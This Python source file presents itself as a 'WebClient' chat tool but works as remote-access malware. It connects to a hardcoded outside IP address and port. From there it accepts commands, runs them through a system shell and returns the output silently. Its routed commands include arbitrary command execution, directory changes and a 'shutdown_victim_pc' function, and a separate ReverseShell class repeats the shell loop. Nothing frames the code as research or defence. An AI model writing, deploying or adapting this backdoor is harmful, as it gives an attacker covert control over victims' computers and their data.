import socket
import time
import threading
import os
import subprocess


CLIENT_EXIT_CODE = '--exit--'
class Status():

    def __init__(self, status):
        self.state = status

        if(isinstance(status, bool) == False):
            self.state = False

    def set_true(self):
        self.state = True

    def set_false(self):
        self.state = False

    def get(self):
        return self.state

class _id_setter():
    
    def __init__(self, object):
        self.object = object
    
    def name(self, val):
        self.object._name = val
    
    def id(self, val):
        self.object.identifier_token = val

    def expiry_date(self, data):
        self.object.expiration_date = data


class _id_getter():

    def __init__(self, object):
        self.object = object
        pass
    
    def name(self):
        return self.object._name
    
    def id(self):
        return self.object.identifier_token


class _ID():

    def __init__(self, id, name):
        self.identifier_token = id
        self._name = name
        self.expiration_date = None
        self.setter = _id_setter(object=self)
        self.getter = _id_getter(object=self)

    
    def attribute_category(self, cat):
        if(cat == 'getters'):
            return self.getter

        elif(cat == 'setters'):
            return self.setter
        

class ComponentID():
    
    def __init__(self, id, name):
        self.ComponentID = _ID(id, name)
    
    def read(self):
        return self.ComponentID.attribute_category('getters')
    
    def write(self):
        return self.ComponentID.attribute_category('setters')


class PROTOCOL():

    def __init__(self):
        pass

    pass


class  ReverseShell():

    def __init__(self, connection):
        self.rev_shell_thread = None
        self.connection = connection

    def process(self):
        while True:
            data = self.connection.recieve_data()
            if data[:2] == 'cd':
                os.chdir(data[3:])

            if len(data) > 0:
                cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte,"utf-8")
                currentWD = os.getcwd() + "> "
                self.connection.send_data(str.encode(output_str + currentWD))
                print(output_str)
    
    def __thread__(self):
        self.rev_shell_thread = threading.Thread(target=self.process)
        self.rev_shell_thread.start()

    def run(self):
        pass

    

class Connection():

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.state = False
        self.remote_ip = None
        self.remote_port = None
        self.show_connection_error = True            #Connection error flag establish_with()
        self.connection_ready_for_use = False        #Makes sure connection is setup for use 

    def __reset_state_to__(self, val):
        self.state = val

    def establish_with(self, IP, PORT):
        try:
            print("Establishing connection....")
            self.socket.connect((IP, PORT))
            self.remote_ip = IP
            self.remote_port = PORT
            self.__reset_state_to__(True)
            self.connection_ready_for_use = True
            print("Connection established with ", self.remote_ip, self.remote_port)
            return True
        except Exception as error:
            if(self.show_connection_error): print("Failed!")
            else: print("Failed! [ERROR]:", error)
            self.__reset_state_to__(False)
            self.connection_ready_for_use = False
            return False
    
    def active(self):
        return self.state

    def send_data(self, data):
        if(self.connection_ready_for_use != True):
            print("[Error]: Connection not ready for sending...  Open() the conenction")
            return False
        
        try:
            self.socket.send(data.encode('utf-8'))
            return True
        except Exception as e:
            self.state = False
            self.connection_ready_for_use = False
            return False
    
    def recieve_data(self):
        if(self.connection_ready_for_use != True):
            print("[Error]: Connection not ready for recieving...  Open() the conenction")
            return False
        
        try:
            message = self.socket.recv(1024).decode('utf-8')
            if(message == ""):
                return False
            
            return message
        except Exception as e:
            self.state = False
            self.connection_ready_for_use = False
            return False

    def open(self):
        if(self.connection_ready_for_use == True):
            self.__reset_state_to__(True)
        
        else:
            self.__reset_state_to__(False)
        
    def close(self):
        self.connection_ready_for_use = False
        self.state = False
        self.socket.close()
    
    def local_machine_address(self):
        return self.socket.getsockname()
    
    def remote_server_address(self):
        return self.socket.getpeername()
    



class CommandRouter():

    def __init__(self):
        self._command_map = {
        }

    def verify_format(self, command):
        value = (command[0] == "/" and len(command[1:]) > 0)
        return value
    
    def extract_command_and_message(self, command):
        slash = command[0]
        name = ""
        if(command.find(" ") != -1):
            name = command[1:command.find(" ", 1)]
            #print(name, "yes space")
        
        else:
            name = command[1:len(command)]
            #print(name, "no space")
       
        #name = name.replace(" ", "")
        
        if((name != None or name != "") and (slash == "/")):

            return (slash+name, command[len(slash+name)+1:len(command)])
        
        return None
        
    def print_commands(self):
        for command in self._command_map:
            print(command)

    def add_command(self, name, callback):
        self._command_map[name] = callback
        return True
    

    def remove_command(self, name):
        return self._command_map.pop(name)

    def contains_command(self, message):
        value = self.extract_command_and_message(message)
        if(value == None): return False
        return True

    def command_executor(self, message):
        try:
            data = self.extract_command_and_message(message)
            if(data == None): return False
            command_name = data[0]
            command = data[1]
            
            #print(command_name +":"+command+":"+"fniallly")
            response = self._command_map[command_name](command)
            return response
        
        except Exception as error:
            #print(" \x1b[31mcommand doesn't exists\x1b[0m", error)
            return " \x1b[31mcommand doesn't exists\x1b[0m" + str(error)



class CommandPrompt():

    def __init__(self) -> None:
        pass

    def modify_directory(self, data):
        
        os.chdir(data)
        currentWD = os.getcwd() + ">"
        return currentWD
    

    def shutdown_victim_pc(self, data):
        if(data == ""):
            data = 10
        command = "shutdown /s /t " + str(data)
        return self.execute_generic(command)
    
    def cancel_shutdown_victim_pc(self, data):
        command = "shutdown -a"
        return self.execute_generic(command)
    
    def execute_generic(self, data):
        cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        return output_str


class WebClient():

    def __init__(self, name):
        self.connection = Connection()
        self.local_address = None
        self.remote_address = None
        self.client_id = ComponentID('client_id', name)
        self.status = Status(False)

        self.command_router = CommandRouter()
        self.cmd = CommandPrompt()

        self.command_router.add_command('/cd', self.cmd.modify_directory)
        self.command_router.add_command('/cmd', self.cmd.execute_generic)
        self.command_router.add_command('/shutdown', self.cmd.shutdown_victim_pc)
        self.command_router.add_command('/cancelshutdown', self.cmd.cancel_shutdown_victim_pc)
        #self.shell = ReverseShell()


    def connect_to(self, IP, PORT):
        if(self.connection.establish_with(IP, PORT)):
            print("[Web Client] - " + self.client_id.read().name(), "is active and connected")
            self.remote_address = self.connection.remote_server_address()
            self.local_address = self.connection.local_machine_address()
            self.status.set_true()
        
        else:
            self.status.set_false()
            print("[Web Client - " + self.client_id.read().name(), "] is NOT active and disconnected")
        return self

    def process2(self, data):
    
        #cd command
        if data[:2] == 'cd':
            os.chdir(data[3:])

        if len(data) > 0:
            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + ">"
            self.send_message(output_str + currentWD)
            #self.connection.send_data(str.encode(output_str + currentWD))
            #print(output_str)


    def process(self, data):
        response = self.command_router.command_executor(data)
        if(response != False): self.send_message_invisibly(response)
        else: self.send_message_invisibly("No command output")
    

    def __reciever__(self):

        while(True):
            val = self.recieve_message()
            if(val == False):
                self.status.set_false()
                self.connection.close()
                return
            
            
    def run(self):

        if(self.status.get() == False):
            print("In-active web client can't run")
            return
        
        self.connection.open()

        print("            Web Client   ")
        print("_____________________________________")
        print("Local Address:", self.local_address)
        print("Connected to:", self.remote_address)

        recv_thread = threading.Thread(target=self.__reciever__)
        recv_thread.start()

        val = None
        status = None
        while((self.connection.active() == True) and (self.status.get() == True)):
            val = input()
            if(val == CLIENT_EXIT_CODE):
                self.status.set_false()
                self.connection.close()
                break
            
            status = self.send_message(val)
            if(status == False):
                self.status.set_false()
                self.connection.close()
                break

        print("           Web Client Closed")
        print("______________________________________")
        return self



    def send_message_invisibly(self, message):
        val = None
        if(self.connection.active() == True):
            val = self.connection.send_data(message)
            #print("[SENT]: ", message)
        return val
    
    def send_message(self, message):
        #Need to detect if the socket on the other side has gone, offline or clsoed
        val = None
        if(self.connection.active() == True):
            val = self.connection.send_data(message)
            print("[SENT]: ", message)
        return val

    
    def recieve_message(self):
        #Need to detech if the socket on the other side has gone, offline or closed
        message = None
        if(self.connection.active()):
            message = self.connection.recieve_data()
        
        #
        if(message == None or message == "--Close Connection--"):
            self.connection.close()
            self.status.set_false()
            return "Close flag"

        if(isinstance(message, bool) == False):
            if(message[0] == '-'):
                self.connection.close()
                self.status.set_false()
            if(self.command_router.contains_command(message) == False):
                print("[Recieved]: ", message)
        
        
        if(message!= None and isinstance(message, bool) == False): self.process(message)


        #print("[RECIEVED]:", message)
        return message

    def close(self):
        if(self.status.get() == True and self.connection.active() == True):
            self.status.set_false()
            self.connection.close()
            print("Closed connection")
            return
        
        print("Connection already was closed")
        return

    def get_card(self):
        return self.client_id


client = WebClient('Jaedon')
client.connect_to('38.56.129.131', 9999).run()
print("Closing", client.get_card().read().name())
client.close()

#NOTE: 1) Needs multiclient support
#      2) Protocol implementation
#      3) 
